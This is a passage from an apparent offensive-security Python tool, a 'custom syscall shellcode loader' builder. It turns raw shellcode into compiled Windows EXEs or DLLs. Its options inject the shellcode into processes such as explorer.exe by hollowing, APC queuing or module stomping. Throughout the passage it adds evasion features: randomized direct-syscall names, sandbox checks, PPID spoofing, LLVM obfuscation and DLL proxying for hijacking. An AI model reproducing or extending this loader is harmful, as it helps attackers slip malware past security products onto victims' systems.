        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", invoke_sandbox_check)

    # Thanks tothi! https://github.com/tothi/dll-hijack-by-proxying
    if dll_proxy != None:
        dll = True
        print("[+] Using {} for DLL Proxying".format(dll_proxy))
        legit_dll = pefile.PE(dll_proxy)
        dll_basename = os.path.splitext(dll_proxy)[0]

        f = open("stub.def", "w")
        f.write("EXPORTS\n")
        for export in legit_dll.DIRECTORY_ENTRY_EXPORT.symbols:
            if export.name:
                f.write('{}={}.{} @{}\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal))
        f.close()

    if dll == True:
        print("[+] Generating DLL instead of exe")
        stub = stub.replace("REPLACE_DLL_MAIN", rundll_stub)
        verbose = False
        if outfile == "a.exe":
            outfile = "a.dll"
    else:
        stub = stub.replace("REPLACE_DLL_MAIN", "")

    #Randomize Syscall names
    f = open("Syscalls.h", "r")
    syscall_contents = f.read()
    f.close()
    if no_randomize != True:
        print("[+] Randomizing syscall names")
        name_len = 19
        syscalls = ["NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread", "NtDelayExecution"]
        for syscall in syscalls:
            random_syscall = generateRandomSyscall(name_len)
            syscall_contents = syscall_contents.replace(syscall, random_syscall)
            stub = stub.replace(syscall, random_syscall)
    #print(syscall_contents)
    f = open("Syscalls2.h", "w")
    f.write(syscall_contents)
    f.close()

    if verbose == True:
        print("[+] Verbose messages enabled")

    file = open("stub.cpp", "w")
    file.write(stub)
    file.close()
    print("[+] Saved new stub to stub.cpp")
    print("[+] Compiling new stub...")
    if verbose == True:
        if obfuscator_LLVM == True:
            print("[+] Using Obfuscator-LLVM to compile stub...")
            # Feel free to modify the OLLVM flags to fit your needs.
            os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,console -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
        else:
            os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
    else:
        if obfuscator_LLVM == True:
            print("[+] Using Obfuscator-LLVM to compile stub...")
            # Feel free to modify the OLLVM flags to fit your needs.
            if dll == True and dll_proxy != None:
                os.system("x86_64-w64-mingw32-clang++ stub.cpp stub.def -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
                os.system("rm stub.def")
            elif dll == True and dll_proxy == None:
                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
            else:
                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,windows -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
        else:
            if dll == True and dll_proxy != None:
                os.system("x86_64-w64-mingw32-g++ stub.cpp stub.def -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -o {}".format(outfile))
                os.system("rm stub.def")
            elif dll == True and dll_proxy == None:
                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -o {}".format(outfile))
            else:
                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o {}".format(outfile))
    if os.path.exists(outfile) == True:
        print("[!] {} has been compiled successfully!".format(outfile))
    else:
        print("[!] Stub compilation failed! Something went wrong!")
    os.system("rm stub.cpp")
    os.system("rm Syscalls2.h")


print(inspiration[1:-1])
parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSCALL SHELLCODE LOADER')
parser.add_argument("file", help="File containing raw shellcode", type=str)
parser.add_argument('-p', '--process', dest='process', help='Process to inject into (Default: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
parser.add_argument('-w', '--word-encode', action='store_true', help='Save shellcode in stub as array of English words')
parser.add_argument('-nr', '--no-randomize', action='store_true', help='Disable syscall name randomization')
parser.add_argument('-ns', '--no-sandbox', action='store_true', help='Disable sandbox checks')
parser.add_argument('-np', '--no-ppid-spoof', action='store_true', help='Disable PPID spoofing')
parser.add_argument('-l', '--llvm-obfuscator', action='store_true', help='Use Obfuscator-LLVM to compile stub')
parser.add_argument('-g', '--get-syscallstub', action='store_true', help='Use GetSyscallStub instead of SysWhispers2')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable debugging messages upon execution')
parser.add_argument('-d', '--dll', action='store_true', help='Generate a DLL instead of EXE')
parser.add_argument('-dp', '--dll-proxy', dest='dll_proxy', metavar='apphelp.dll', help='Create Proxy DLL using supplied legitimate DLL (File must exist in current dir)')
parser.add_argument('-s', '--sandbox', dest='sandbox', help='Sandbox evasion technique (Options: sleep, domain, hostname, username, dll) (Default: sleep)', metavar='domain', default='sleep')
parser.add_argument('-sa', '--sandbox-arg', dest='sandbox_arg', help='Argument for sandbox evasion technique (Ex: WIN10CO-DESKTOP, testlab.local)', metavar='testlab.local')
parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
try:
    if os.path.exists(args.out) == True:
        os.system("rm {}".format(args.out))
    sandbox = args.sandbox.lower()
    if args.no_sandbox == False:
        if sandbox != "dll" and sandbox != "hostname" and sandbox != "domain" and sandbox != "username" and sandbox != "sleep":
            print("[!] Invalid sandbox evasion technique provided!")
            print("[+] Valid sandbox evasion techniques are: domain, hostname, username, dll, sleep")
            sys.exit()
        if sandbox == "hostname" and args.sandbox_arg == None:
            print("[!] No hostname specified for hostname based sandbox evasion. Please supply it using the '-sa' flag.")
            sys.exit()
        if sandbox == "username" and args.sandbox_arg == None:
            print("[!] No username specified for username based sandbox evasion. Please supply it using the '-sa' flag.")
            sys.exit()
        if sandbox == "domain" and args.sandbox_arg == None:
            print("[!] No domain specified for domain based sandbox evasion. Please supply it using the '-sa' flag.")
            sys.exit()
    method = args.method.lower()
    if method != "queueuserapc" and method != "modulestomping" and method != "functionstomping" and method != "processhollow" and method != "enumdisplaymonitors" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread":
        print("[!] Invalid shellcode execution method provided!")
        print("[+] Valid shellcode execution methods are: ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
        sys.exit()
    if args.llvm_obfuscator == True:
        args.get_syscallstub = True
    if args.process == "msedge.exe":
        args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
    elif args.process == "iexplore.exe":
        args.process = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"
    key = generateKey(49)
    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, sandbox, args.get_syscallstub, args.no_sandbox, args.llvm_obfuscator, args.word_encode, args.dll, args.sandbox_arg, args.no_ppid_spoof, args.dll_proxy)
except:
    raise
    sys.exit()
